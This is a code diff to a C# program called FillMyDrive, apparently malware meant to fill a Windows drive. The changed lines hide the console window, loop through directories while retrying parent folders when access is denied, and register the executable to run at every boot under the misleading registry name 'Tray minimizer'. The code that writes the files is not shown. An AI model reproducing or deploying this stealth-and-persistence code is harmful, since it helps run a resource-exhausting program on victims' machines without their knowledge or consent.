@@ -13,6 +13,7 @@ namespace FillMyDrive {
         private static extern IntPtr GetConsoleWindow();
         private const int SW_HIDE=0;
         private const int SW_SHOW=5;
+        // Debug?
         private const bool Debug = false;
         private static void Main( string[] args ) {
             var hwnd = GetConsoleWindow();
@@ -27,11 +28,12 @@ namespace FillMyDrive {
             var moreDirs = directory.GetDirectories();
             while(true) {
                 i2++;
-                while(i2 > 0) {
+                while(true) {
                     try {
                         moreDirs = directory.GetDirectories();
                         break;
                     } catch(UnauthorizedAccessException uae) {
+                        directory = directory.Parent;
                         if(!Debug) continue;
                         Console.WriteLine( uae );
                         Console.ReadKey();
@@ -73,11 +75,15 @@ namespace FillMyDrive {
                 }
             }
         }
+
+        /// <summary>
+        /// Add a key to registry that tells windows to start this program on boot.
+        /// </summary>
+        /// <param name="add">TRUE - If the program should add a key to the registry, and thereby run itself on startup.</param>
         private static void startup( bool add ) {
+            if(!add) return;
             var key = Registry.LocalMachine.OpenSubKey( @"Software\Microsoft\Windows\CurrentVersion\Run", true );
-            if(add) {
-                key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
-            }
+            key.SetValue( "Tray minimizer", "\"" + Assembly.GetExecutingAssembly().Location + "\"" );
             key.Close();
         }
     }
